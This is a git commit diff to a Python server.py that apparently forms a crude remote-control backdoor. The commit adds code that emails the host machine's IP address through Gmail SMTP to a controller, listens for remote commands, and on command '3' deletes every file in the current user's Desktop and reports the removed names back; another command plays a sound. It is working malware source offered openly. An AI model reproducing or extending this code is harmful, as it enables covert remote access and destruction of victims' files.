886773dbae1ceda2f8d7318a08c0ba6e93580053
SAIREX <113220566+sairex53@users.noreply.github.com>
2023-11-25 23:16:50 +0700

    Update before version 2.0
    Add connect by email.
    Server send email with his ip address, while the client reading this email and connect to him.

--- server.py
+++ server.py
@@ -3,50 +3,90 @@ import pygame
 import time
 import shutil
 import os
+import getpass
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
+def get_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    ip = s.getsockname()[0]
+    s.close()
+    s.detach()
+    return ip
+
+def send_email_ip():
+    smtp_server = smtplib.SMTP("smtp.gmail.com", 587)
+    smtp_server.starttls()
+    smtp_server.login("email", "app_password")
+    #Create message
+    msg= MIMEMultipart()
+    msg["From"] = "from_email"
+    msg["To"] = "to_email"
+    #Text message
+    msg["Subject"] = "IP ADDRESS"
+    text = f"{get_ip()}"
+    msg.attach(MIMEText(text, "plain"))
+    #Send 
+    smtp_server.sendmail("from_email", "to_email", msg.as_string())
+    smtp_server.close()
+    print("Sended!")
 
 while True:
     serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    serv.bind(("localhost", 9999))
-    print("#Wait message...")
+    serv.bind((f"{get_ip()}", 9999))
+    print("IP: ", get_ip(), "\n#Wait message...")
+    send_email_ip()
     serv.listen(1)
-    time.sleep(3)
     client, addr = serv.accept()
     msg = client.recv(1024).decode()
 
     if msg == "start":
         client.send("connect".encode())
         print("$Connected")
-        
+
         while True:
             error = True
 
             msg = client.recv(1024).decode()
             
             if msg == "0":
-                client.send("test".encode())
+                client.send("$ -> # \nTest successutifull".encode())
 
             elif msg == "1":
+                error = False
                 pygame.mixer.init()
+
                 pygame.mixer.music.load("sound.mp3")
                 pygame.mixer.music.play()
-                client.send("played".encode())
+                client.send("#Sound played".encode())
 
             elif msg == "2":
                 print("$Client disconnect")
-                client.send("close".encode())
+                client.send("$Client closed".encode())
                 time.sleep(1)
                 client.close()
                 serv.close()
                 break
+
+            elif msg == "4":
+                print("#Close server")
+                client.send("$Client closed\n#Server closed".encode())
+                time.sleep(1)
+                client.close()
+                serv.close()
+                exit()
             
             elif msg == "3":
-                directory = "/Users/sairex/Desktop" 
+                USER_NAME = getpass.getuser()                
+                directory = r'/Users/%s/Desktop' % USER_NAME
                 files = os.listdir(directory) 
                 listToString = str(files)
                 sendList = "Removed: ",listToString 
-
-                dir = '/Users/sairex/Desktop/'
+                USER_NAME = getpass.getuser()
+                dir = f'/Users/{USER_NAME}/Desktop/'
                 for files in os.listdir(dir):
                     path = os.path.join(dir, files)
                     try:
@@ -56,18 +96,11 @@ while True:
 
                 client.send(str(sendList).encode())
                 error = False
-            
-            elif msg == "error2":
-                print("$Client disconnect")
-                client.close()
-                serv.close()
-                break
 
             else:
                 if error == True:
-                    client.send("error0".encode())
-                    #Error 0 this is error message
+                    client.send("$Error message".encode())
                 else:
                     pass
-                                   
-
+    else:
+        print("Error")
